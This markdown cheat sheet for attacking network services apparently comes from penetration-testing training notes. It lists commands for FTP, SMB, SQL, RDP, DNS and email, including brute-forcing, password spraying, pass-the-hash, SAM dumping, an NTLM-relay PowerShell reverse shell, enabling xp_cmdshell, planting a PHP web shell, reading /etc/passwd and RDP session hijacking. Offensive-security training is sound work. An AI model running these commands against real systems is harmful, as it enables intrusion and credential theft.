> See also: [Footprinting](footprinting.md) for enumeration commands against these services.

## Attacking FTP

Connecting to the FTP server using the `ftp` client.

```
ftp 192.168.2.142
```

Connecting to the FTP server using `netcat`.

```
nc -v 192.168.2.142 21
```

Brute-forcing the FTP service.

```
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142
```

---

## Attacking SMB

Null-session testing against the SMB service.

```
smbclient -N -L //10.129.14.128
```

Network share enumeration using `smbmap`.

```
smbmap -H 10.129.14.128
```

Recursive network share enumeration using `smbmap`.

```
smbmap -H 10.129.14.128 -r notes
```

Download a specific file from the shared folder.

```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Upload a specific file to the shared folder.

```
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

Null-session with the `rpcclient`.

```
rpcclient -U'%' 10.10.110.17
```

Automated enumeratition of the SMB service using `enum4linux-ng`.

```
./enum4linux-ng.py 10.10.11.45 -A -C
```

Password spraying against different users from a list.

```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'
```

Connect to the SMB service using the `impacket-psexec`.

```
impacket-psexec administrator:'Password123!'@10.10.110.17
```

Execute a command over the SMB service using `crackmapexec`.

```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Enumerating Logged-on users.

```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Extract hashes from the SAM database.

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Use the Pass-The-Hash technique to authenticate on the target host.

```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Dump the SAM database using `impacket-ntlmrelayx`.

```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```

---

## Attacking SQL Databases

Connecting to the MySQL server.

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

Connecting to the MSSQL server.

```
sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30
```

Connecting to the MSSQL server from Linux.

```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.

```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

Show all available databases in MySQL.

```
mysql> SHOW DATABASES;
```

Select a specific database in MySQL.

```
mysql> USE htbusers;
```

Show all available tables in the selected database in MySQL.

```
mysql> SHOW TABLES;
```

Select all available entries from the "users" table in MySQL.

```
mysql> SELECT * FROM users;
```

Show all available databases in MSSQL.

```
sqlcmd> SELECT name FROM master.dbo.sysdatabases
```

Select a specific database in MSSQL.

```
sqlcmd> USE htbusers
```

Show all available tables in the selected database in MSSQL.

```
sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES
```

Select all available entries from the "users" table in MSSQL.

```
sqlcmd> SELECT * FROM users
```

To allow advanced options to be changed.

```
sqlcmd> EXECUTE sp_configure 'show advanced options', 1
```

To enable the xp_cmdshell.

```
sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1
```

To be used after each sp_configure command to apply the changes.

```
sqlcmd> RECONFIGURE
```

Execute a system command from MSSQL server.

```
sqlcmd> xp_cmdshell 'whoami'
```

Create a file using MySQL.

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```

Check if the the secure file privileges are empty to read locally stored files on the system.

```
mysql> show variables like "secure_file_priv";
```

Read local files in MSSQL.

```
sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

Read local files in MySQL.

```
mysql> select LOAD_FILE("/etc/passwd");
```

Hash stealing using the `xp_dirtree` command in MSSQL.

```
sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

Hash stealing using the `xp_subdirs` command in MSSQL.

```
sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

Identify linked servers in MSSQL.

```
sqlcmd> SELECT srvname, isremote FROM sysservers
```

Identify the user and its privileges used for the remote connection in MSSQL.

```
sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

---

## Attacking RDP

Password spraying against the RDP service.

```
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

Brute-forcing the RDP service.

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Connect to the RDP service using `rdesktop` in Linux.

```
rdesktop -u admin -p password123 192.168.2.143
```

Impersonate a user without its password.

```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Execute the RDP session hijack.

```
net start sessionhijack
```

Enable "Restricted Admin Mode" on the target Windows host.

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Use the Pass-The-Hash technique to login on the target host without a password.

```
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```

---

## Attacking DNS

Perform an AXFR zone transfer attempt against a specific name server.

```
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

Brute-forcing subdomains.

```
subfinder -d inlanefreight.com -v
```

DNS lookup for the specified subdomain.

```
host support.inlanefreight.com
```

---

## Attacking Email Services

DNS lookup for mail servers for the specified domain.

```
host -t MX microsoft.com
```

DNS lookup for mail servers for the specified domain.

```
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

DNS lookup of the IPv4 address for the specified subdomain.

```
host -t A mail1.inlanefreight.htb.
```

Connect to the SMTP server.

```
telnet 10.10.110.20 25
```

SMTP user enumeration using the RCPT command against the specified host.

```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

Verify the usage of Office365 for the specified domain.

```
python3 o365spray.py --validate --domain msplaintext.xyz
```

Enumerate existing users using Office365 on the specified domain.

```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

Password spraying against a list of users that use Office365 for the specified domain.

```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

Brute-forcing the POP3 service.

```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

Testing the SMTP service for the open-relay vulnerability.

```
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```
